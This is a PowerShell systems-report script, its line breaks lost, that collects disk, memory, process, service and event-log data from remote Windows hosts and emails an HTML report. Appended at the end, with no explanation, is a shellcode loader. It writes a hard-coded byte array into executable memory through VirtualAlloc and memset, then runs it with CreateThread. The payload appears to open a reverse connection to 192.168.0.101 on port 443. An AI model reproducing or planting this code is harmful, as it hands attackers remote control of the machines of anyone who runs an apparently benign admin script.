$users = "mmessano@primealliancesolutions.com" $fromemail = "DataManagement@primealliancesolutions.com"$server = "outbound.smtp.dexma.com" $list = "C:\Users\MMessano\Desktop\Payload_QA.txt"$computers = get-content $list $thresholdspace = 65[int]$EventNum = 3[int]$ProccessNumToFetch = 10$ListOfAttachments = @()$Report = @()$CurrentTime = Get-DateFunction Create-PieChart() {param([string]$FileName)[void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")[void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms.DataVisualization")$Chart = New-object System.Windows.Forms.DataVisualization.Charting.Chart $Chart.Width = 300$Chart.Height = 290 $Chart.Left = 10$Chart.Top = 10$ChartArea = New-Object System.Windows.Forms.DataVisualization.Charting.ChartArea$Chart.ChartAreas.Add($ChartArea) [void]$Chart.Series.Add("Data") foreach ($value in $args[0]) {Write-Host "Now processing chart value: " + $value$datapoint = new-object System.Windows.Forms.DataVisualization.Charting.DataPoint(0, $value)$datapoint.AxisLabel = "Value" + "(" + $value + " GB)"$Chart.Series["Data"].Points.Add($datapoint)}$Chart.Series["Data"].ChartType = [System.Windows.Forms.DataVisualization.Charting.SeriesChartType]::Pie$Chart.Series["Data"]["PieLabelStyle"] = "Outside" $Chart.Series["Data"]["PieLineColor"] = "Black" $Chart.Series["Data"]["PieDrawingStyle"] = "Concave" ($Chart.Series["Data"].Points.FindMaxByValue())["Exploded"] = $true$Title = new-object System.Windows.Forms.DataVisualization.Charting.Title $Chart.Titles.Add($Title) $Chart.Titles[0].Text = "RAM Usage Chart (Used/Free)"$Chart.SaveImage($FileName + ".png","png")}Function Get-HostUptime {param ([string]$ComputerName)$Uptime = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName$LastBootUpTime = $Uptime.ConvertToDateTime($Uptime.LastBootUpTime)$Time = (Get-Date) - $LastBootUpTimeReturn '{0:00} Days, {1:00} Hours, {2:00} Minutes, {3:00} Seconds' -f $Time.Days, $Time.Hours, $Time.Minutes, $Time.Seconds}$HTMLHeader = @"<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd"><html><head><title>My Systems Report</title><style type="text/css"><!--body {font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;}table{border-collapse: collapse;border: none;font: 10pt Verdana, Geneva, Arial, Helvetica, sans-serif;color: black;margin-bottom: 10px;}table td{font-size: 12px;padding-left: 0px;padding-right: 20px;text-align: left;}table th {font-size: 12px;font-weight: bold;padding-left: 0px;padding-right: 20px;text-align: left;}h2{ clear: both; font-size: 130%; }h3{clear: both;font-size: 115%;margin-left: 20px;margin-top: 30px;}p{ margin-left: 20px; font-size: 12px; }table.list{ float: left; }table.list td:nth-child(1){font-weight: bold;border-right: 1px grey solid;text-align: right;}table.list td:nth-child(2){ padding-left: 7px; }table tr:nth-child(even) td:nth-child(even){ background: table tr:nth-child(odd) td:nth-child(odd){ background: table tr:nth-child(even) td:nth-child(odd){ background: table tr:nth-child(odd) td:nth-child(even){ background: div.column { width: 320px; float: left; }div.first{ padding-right: 20px; border-right: 1px  grey solid; }div.second{ margin-left: 30px; }table{ margin-left: 20px; }--></style></head><body>"@foreach ($computer in $computers) {$DiskInfo= Get-WMIObject -ComputerName $computer Win32_LogicalDisk | Where-Object{$_.DriveType -eq 3} | Where-Object{ ($_.freespace/$_.Size)*100 -lt $thresholdspace} `| Select-Object SystemName, DriveType, VolumeName, Name, @{n='Size (GB)';e={"{0:n2}" -f ($_.size/1gb)}}, @{n='FreeSpace (GB)';e={"{0:n2}" -f ($_.freespace/1gb)}}, @{n='PercentFree';e={"{0:n2}" -f ($_.freespace/$_.size*100)}} | ConvertTo-HTML -fragment$OS = (Get-WmiObject Win32_OperatingSystem -computername $computer).caption$SystemInfo = Get-WmiObject -Class Win32_OperatingSystem -computername $computer | Select-Object Name, TotalVisibleMemorySize, FreePhysicalMemory$TotalRAM = $SystemInfo.TotalVisibleMemorySize/1MB$FreeRAM = $SystemInfo.FreePhysicalMemory/1MB$UsedRAM = $TotalRAM - $FreeRAM$RAMPercentFree = ($FreeRAM / $TotalRAM) * 100$TotalRAM = [Math]::Round($TotalRAM, 2)$FreeRAM = [Math]::Round($FreeRAM, 2)$UsedRAM = [Math]::Round($UsedRAM, 2)$RAMPercentFree = [Math]::Round($RAMPercentFree, 2)$TopProcesses = Get-Process -ComputerName $computer | Sort WS -Descending | Select ProcessName, Id, WS -First $ProccessNumToFetch | ConvertTo-Html -Fragment$ServicesReport = @()$Services = Get-WmiObject -Class Win32_Service -ComputerName $computer | Where {($_.StartMode -eq "Auto") -and ($_.State -eq "Stopped")}foreach ($Service in $Services) {$row = New-Object -Type PSObject -Property @{Name = $Service.NameStatus = $Service.StateStartMode = $Service.StartMode}$ServicesReport += $row}$ServicesReport = $ServicesReport | ConvertTo-Html -Fragment$SystemEventsReport = @()$SystemEvents = Get-EventLog -ComputerName $computer -LogName System -EntryType Error,Warning -Newest $EventNumforeach ($event in $SystemEvents) {$row = New-Object -Type PSObject -Property @{TimeGenerated = $event.TimeGeneratedEntryType = $event.EntryTypeSource = $event.SourceMessage = $event.Message}$SystemEventsReport += $row}$SystemEventsReport = $SystemEventsReport | ConvertTo-Html -Fragment$ApplicationEventsReport = @()$ApplicationEvents = Get-EventLog -ComputerName $computer -LogName Application -EntryType Error,Warning -Newest $EventNumforeach ($event in $ApplicationEvents) {$row = New-Object -Type PSObject -Property @{TimeGenerated = $event.TimeGeneratedEntryType = $event.EntryTypeSource = $event.SourceMessage = $event.Message}$ApplicationEventsReport += $row}$ApplicationEventsReport = $ApplicationEventsReport | ConvertTo-Html -FragmentCreate-PieChart -FileName ((Get-Location).Path + "\chart-$computer") $FreeRAM, $UsedRAM$ListOfAttachments += "chart-$computer.png"$SystemUptime = Get-HostUptime -ComputerName $computer$CurrentSystemHTML = @"<hr noshade size=3 width="100%"><div id="report"><p><h2>$computer Report</p></h2><h3>System Info</h3><table class="list"><tr><td>System Uptime</td><td>$SystemUptime</td></tr><tr><td>OS</td><td>$OS</td></tr><tr><td>Total RAM (GB)</td><td>$TotalRAM</td></tr><tr><td>Free RAM (GB)</td><td>$FreeRAM</td></tr><tr><td>Percent free RAM</td><td>$RAMPercentFree</td></tr></table><IMG SRC="chart-$computer.png" ALT="$computer Chart"><h3>Disk Info</h3><p>Drive(s) listed below have less than $thresholdspace % free space. Drives above this threshold will not be listed.</p><table class="normal">$DiskInfo</table><br></br><div class="first column"><h3>System Processes - Top $ProccessNumToFetch Highest Memory Usage</h3><p>The following $ProccessNumToFetch processes are those consuming the highest amount of Working Set (WS) Memory (bytes) on $computer</p><table class="normal">$TopProcesses</table></div><div class="second column"><h3>System Services - Automatic Startup but not Running</h3><p>The following services are those which are set to Automatic startup type, yet are currently not running on $computer</p><table class="normal">$ServicesReport</table></div><h3>Events Report - The last $EventNum System/Application Log Events that were Warnings or Errors</h3><p>The following is a list of the last $EventNum <b>System log</b> events that had an Event Type of either Warning or Error on $computer</p><table class="normal">$SystemEventsReport</table><p>The following is a list of the last $EventNum <b>Application log</b> events that had an Event Type of either Warning or Error on $computer</p><table class="normal">$ApplicationEventsReport</table>"@$HTMLMiddle += $CurrentSystemHTML}$HTMLEnd = @"</div></body></html>"@$HTMLmessage = $HTMLHeader + $HTMLMiddle + $HTMLEnd$HTMLmessage | Out-File ((Get-Location).Path + "\report.html")send-mailmessage -from $fromemail -to $users -subject "Systems Report" -Attachments $ListOfAttachments -BodyAsHTML -body $HTMLmessage -priority Normal -smtpServer $server$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x65,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};